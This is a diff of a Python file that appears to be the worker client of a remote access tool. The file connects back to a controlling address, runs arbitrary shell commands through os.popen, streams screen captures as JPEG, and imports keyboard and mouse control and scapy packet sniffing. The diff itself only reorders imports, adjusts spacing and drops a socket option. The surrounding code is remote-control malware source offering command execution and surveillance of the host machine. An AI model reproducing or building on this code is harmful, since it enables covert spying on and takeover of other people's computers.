@@ -5,14 +5,17 @@ from typing import Callable
 import os
 import struct
 import subprocess
+
+import cv2
+import numpy as np
 import pyautogui
 import keyboard
 from pynput.mouse import Button,Controller
 from scapy.all import sniff
 from scapy.utils import wrpcap
 import mss
-import numpy as np
-import cv2
+from io import BytesIO
+from PIL import Image
 
 def cmd(command:str) ->bytes:
     return os.popen(command).read().encode()
@@ -122,7 +125,7 @@ def live_stream(doesnt_matter:str) -> bytes:
         monitor = sct.monitors[1]
         frame = np.array(sct.grab(monitor))
         frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
+        encoded, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY,50])
         return buffer.tobytes()
 
 
@@ -142,7 +145,6 @@ class Worker:
 
                 self.client.send("connected".encode())
                 self.stream_client.connect((self.address[0],self.address[1]+1))
-                self.stream_client.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
 
                 print("connection succeeded")
                 break
